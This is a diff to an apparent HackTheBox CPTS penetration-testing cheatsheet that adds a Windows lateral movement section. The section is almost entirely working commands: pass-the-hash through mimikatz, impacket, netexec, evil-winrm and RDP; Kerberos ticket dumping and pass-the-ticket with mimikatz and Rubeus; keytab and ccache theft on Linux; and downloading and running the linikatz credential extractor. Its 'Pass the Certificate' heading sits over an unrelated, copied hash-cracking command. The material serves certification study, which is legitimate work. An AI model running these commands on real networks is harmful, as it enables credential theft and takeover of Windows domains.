@@ -39,8 +39,11 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Credential Hunting In Network Traffic](#credential-hunting-in-network-traffic)
     - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
     - [Cracking Passwords](#cracking-passwords)
-    - [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
-    -- [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
+- [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
+    - [Pass the Hash (PtH)](#pass-the-hash)
+    - [Pass the Ticket (PtT) from Windows](#pass-the-ticket-from-windows)
+    - [Pass the Ticket (PtT) from Linux](#pass-the-ticket-from-linux)
+    - [Pass the Certificate](#pass-the-certificate)
 - [Attacking Common Services](#attacking-common-services)
     - [Attacking SMB](#attacking-smb)
     - [Attacking SQL](#attacking-sql)
@@ -600,13 +603,124 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 # Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
 office2john.py Protected.docx > protected-docx.hash  
 ```
-##### Windows Lateral Movement Techniques
+## Windows Lateral Movement Techniques
+
+##### Pass the Hash (PtH)
+```
+# Pass the Hash from Windows Using Mimikatz to spawn new cmd.exe process under the identity of user julio using their NTLM hash
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+# Pass the Hash with Impacket (Linux) 
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+or
+impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+or
+impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+or
+impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+
+# Pass the Hash with NetExec
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+# Pass the Hash with NetExec and execute command
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+
+# Pass the Hash with evil-winrm
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+# Pass the Hash with RDP ( Enable Restricted Admin Mode to allow PtH )
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+
+
+```
+##### Pass the Ticket (PtT) from Windows
+```
+# Harvesting Kerberos tickets from Windows by mimikatz ( it wil export ticket to file .kirbi ) 
+mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
+
+# Harvesting Kerberos tickets from Windows by Rubeus   ( it wil export ticket to file .kirbi )
+Rubeus.exe dump /nowrap
+
+(when Exported tickets fail or ticket has expired , we can run below command to extracted Encryption Keys to generate new tickets )
+
+# Mimikatz - Extract Kerberos keys  ( we can get AES256_HMAC and  RC4_HMAC key )  ( RC4_HMAC same NTLM hash) 
+mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
+
+# Mimikatz - Pass the Key aka. OverPass the Hash ( using RC4_HMAC same NTLM hash ) ( spawn new cmd.exe process under the identity of user plaintext )
+mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM>" exit
+
+# Rubeus - Pass the Key aka. OverPass the Hash ( using AES256_HMAC ) 
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256_HMAC> /nowrap
+
+(Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.SO SHOULD USE RUBEUS )
+
+# Rubeus - Pass the Ticket ( using RC4_HMAC same NTLM ) 
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM> /ptt
+
+# Rubeus - Pass the Ticket ( using file ticket .kirbi ) 
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+# Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( current command prompt have priv user plaintext) 
+mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" exit
+
+# Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( spawn new cmd have priv user plaintext ) 
+mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" "misc::cmd" exit
+
+```
+##### Pass the Ticket (PtT) from Linux
+```
+# realm - Check if Linux machine is domain-joined
+realm list
+
+# PS - Check if Linux machine is domain-joined
+ps -ef | grep -i "winbind\|sssd"
+
+# Using Find to search for files with keytab in the name (To use a keytab file, we must have read and write (rw) privileges on the file.)
+find / -name *keytab* -ls 2>/dev/null
+
+# Reviewing environment variables for ccache files.
+env | grep -i krb5
+
+# Using Find to search for files with krb5cc in the name   
+find / -name *krb5cc* -ls 2>/dev/null
+
+# Searching for ccache files in /tmp
+find /tmp -name *krb5cc* -ls 2>/dev/null
+
+# Confirm which ticket we are using
+klist
+
+# Listing KeyTab file information
+list -k -t /opt/specialfiles/carlos.keytab
+
+# Impersonating a user with a KeyTab
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+# Extracting KeyTab hashes with KeyTabExtract  ( https://github.com/sosdave/KeyTabExtract )
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+# Impersonating a user with a KeyTab
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+# Impacket Ticket converter file ccache to kirbi
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+# Importing converted ticket into Windows session with Rubeus
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+# using Linikatz tool to  exploiting credentials on Linux machines when there is an integration with Active Directory 
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+
+```
+##### Pass the Certificate
 ```
 # Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
 office2john.py Protected.docx > protected-docx.hash 
-```
-###### Pass the Hash (PtH)
-```
 ```
 ## Attacking Common Services
 
